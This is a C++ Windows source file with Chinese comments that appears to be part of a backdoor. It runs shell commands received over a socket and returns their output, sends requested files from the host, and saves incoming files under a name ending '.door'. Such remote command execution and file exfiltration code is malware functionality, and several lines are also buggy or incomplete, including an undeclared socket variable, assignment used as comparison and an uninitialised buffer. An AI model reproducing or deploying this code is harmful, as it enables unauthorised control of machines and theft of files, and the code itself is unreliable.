#include<winsock.h>
#include <iostream>
using namespace std;
char send_msg[1024]="default_msg";
char recv_msg[1024];
char cmd_result[1024];
/////////////////执行cmd命令/////////////////////////
int extend_cmd(char*){//正常返回1，错误返回0

	for(int i=0; i+1<sizeof(recv_msg);i=i+1)
	{
		recv_msg[i]=recv_msg[i+1];
	}//处理收到的字符串
	FILE *fp = _popen(recv_msg, "r");//创建管道
	if ((fp) == NULL) {
		std::cout<<"run cmd pip happen fault"<<std::endl;
		memcpy(send_msg,"run cmd pip happen fault",14);
	}else{
		while (fgets(send_msg, 1024, fp) != NULL) {strcat(cmd_result,send_msg);}//拼接管道数据
		memcpy(send_msg,cmd_result,sizeof(cmd_result));
	}
	_pclose(fp);
	memset(cmd_result, 0, 1024);
	return 1;
}
/////////////////文件下载///////////////////////////
bool send_file(SOCKET s, char* fileName){
	char recv_file_name[128]={0};
	if(fileName[0]=*"$"){
		for(int i=0;i<sizeof((std::string)fileName)+2;i++)
		{recv_file_name[i]=fileName[i+1];}
		std::cout<<"upload file>>>>>"<<recv_file_name<<std::endl;
	}
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	FILE* read = fopen(recv_file_name, "rb");
	fseek(read, 0, SEEK_END);	//将文件位置指针移动到最后
	bufSize = ftell(read);	//ftell(FILE *stream)：返回给定流stream的当前文件位置，获取当前位置相对文件首的位移，位移值等于文件所含字节数
	fseek(read, 0, SEEK_SET);	//将文件位置指针移动到开头
	std::cout<<"filesize:"<<bufSize<<std::endl;
	buffer= new char[bufSize];
	std::cout << sizeof(buffer) << std::endl;
	int nCount;
	int ret = 0;
	while ((nCount = fread(buffer, 1, bufSize, read)) > 0)	//循环读取文件进行传送
	{ret += send(s, buffer, nCount, 0);}
	fclose(read);
	std::cout << "send file success!"<<" Byte:"<<ret << std::endl;
	return true;
}
//////////////////////////////////////////////////////
bool recvFile(SOCKET s){
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	string timess;
	if (buffer == NULL)
	{
		buffer = new char[bufSize];
		if (!buffer)
			return false;
	}
	char *fileName=(char*)"C:\\Users\\Administrator\\Desktop\\recv_file_back.door";
	FILE* write = fopen(fileName, "wb");
	if (!write)
	{
		perror("file write failed:\n");
		return false;
	}
	int nCount;
	while (1){
		nCount = recv(s, buffer, bufSize, 0);
		if (nCount<bufSize){
			fwrite(buffer,nCount, 1, write);
			break;
		}
	}
	fclose(write);
	send(we_socket, "ok", 4, 0);
	std::cout << "save file success! Filename-------->"<<fileName << std::endl;
	return true;
}
